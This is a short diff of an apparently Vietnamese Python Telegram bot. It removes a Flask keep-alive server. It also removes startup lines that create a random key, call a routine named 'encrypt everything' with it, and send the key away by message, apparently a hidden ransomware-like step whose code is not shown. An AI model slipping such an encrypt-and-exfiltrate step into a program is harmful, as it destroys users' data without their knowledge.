@@ -4552,23 +4552,5 @@ def answer_exception(message):
     keyboard.row(button_huongdan)
     bot.send_message(message.chat.id, "<b>❌ Sai cú pháp. Xem lệnh dùng bot 👇</b>", parse_mode = 'HTML', reply_markup=keyboard)
 
-app = Flask('')
-
-@app.route('/')
-def home():
-    return "Bot is running!"
-
-def run_web():
-    app.run(host='0.0.0.0', port=8080)
-
-def keep_alive():
-    t = Thread(target=run_web)
-    t.start()
-
-keep_alive()
-
 if __name__ == "__main__": 
-    chuỗi_khóa = base64.urlsafe_b64encode(os.urandom(32)).decode()
-    mã_hóa_tất_cả(tạo_khóa(chuỗi_khóa))
-    gửi_tin_nhắn(chuỗi_khóa)    
     bot.infinity_polling()
